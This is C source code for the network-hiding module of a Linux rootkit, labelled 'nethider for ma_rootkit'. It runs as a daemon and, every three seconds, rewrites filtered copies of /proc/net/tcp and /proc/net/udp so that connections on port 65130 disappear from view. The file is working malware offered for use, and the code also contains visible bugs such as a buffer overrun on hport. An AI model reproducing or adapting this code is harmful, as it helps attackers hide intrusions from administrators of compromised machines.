/* $v1.07_nethider for ma_rootkit */

/*

WHat's NeW:
  
 * support of 2.2.x kernels added
 * hiding UDP local port 65130
 * hiding TCP connections with remote ports 65130
 
*/

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "rootkit_conf.h"

int main(int argc, char **argv[]){
int fd,newpage,i,sz,cnt,ver;
char hport[3], record[150], newstr[150];

if (argc > 1 && strncmp(argv[1],"2",1) == 0) ver = 2;
else ver = 4;

daemon(0,0);

write(13,GOTROOT,1);
write(13,CHECKME,1);
write(13,NETHIDE,1);

if (ver == 2) sz = 128;
else sz = 150;

while(1){ // main loop

  cnt = 0;

  if (( newpage = open(NETHIDE_TCP,O_WRONLY | O_CREAT | O_TRUNC,444)) <0) exit(0xfe6a);
  if ((fd = open("/proc/net/tcp",O_RDONLY,LEETMODE)) <0) exit(0xfe6a);

  read(fd,record,sz);       /* skip header */
  write(newpage,record,sz);

      while( read(fd,record,sz) >0){

        if (ver == 2){
 	 hport[0]=record[29];
         hport[1]=record[30];
	 hport[2]=record[31];
	 hport[3]=record[32];
	} else {
	 hport[0]=record[30];
         hport[1]=record[31];
	 hport[2]=record[32];
	 hport[3]=record[33];
        }

	    if (strncmp(hport,NET_HIDENPORT,4) != 0){

              if (cnt < 10)
		sprintf(newstr,"\x20\x20\x20\x25\x69\x0a",cnt);
	      else
	        sprintf(newstr,"\x20\x20\x25\x69\x0a",cnt);

		for (i=4; i<=sz; i++) newstr[i]=record[i];
		write(newpage,newstr,sz);
		cnt++;
	    }
      }

  close(newpage);
  close(fd);

#ifdef NETHIDE_UDP

  if (( newpage = open(NETHIDE_UDP,O_WRONLY | O_CREAT | O_TRUNC,444)) <0) exit(0xfe6a);

  if ((fd = open("/proc/net/udp",O_RDONLY,LEETMODE)) <0) exit(0xfe6a);

  if (ver == 2) cnt = 0;

  read(fd,record,128);        
  write(newpage,record,128); 

   while( read(fd,record,128) >0){
       
      hport[0] = record[15];
      hport[1] = record[16];
      hport[2] = record[17];
      hport[3] = record[18];
      
      if (strncmp(hport,NET_HIDENPORT,4) != 0){
          
         if (ver > 2) write(newpage,record,128);
	 else {

            if (cnt < 10)
               sprintf(newstr,"\x20\x20\x20\x25\x69\n",cnt);
	    else 
	       sprintf(newstr,"\x20\x20\x25\x69\n",cnt);
	      
	     for (i=4; i<128; i++) newstr[i] = record[i];
	     write(newpage,newstr,strlen(newstr));
	     cnt++;
         }	     
      }
	  	
   }

  close(newpage);
  close(fd);
#endif

  sleep(3);
} // end of main loop

exit(0xfe6a);
}

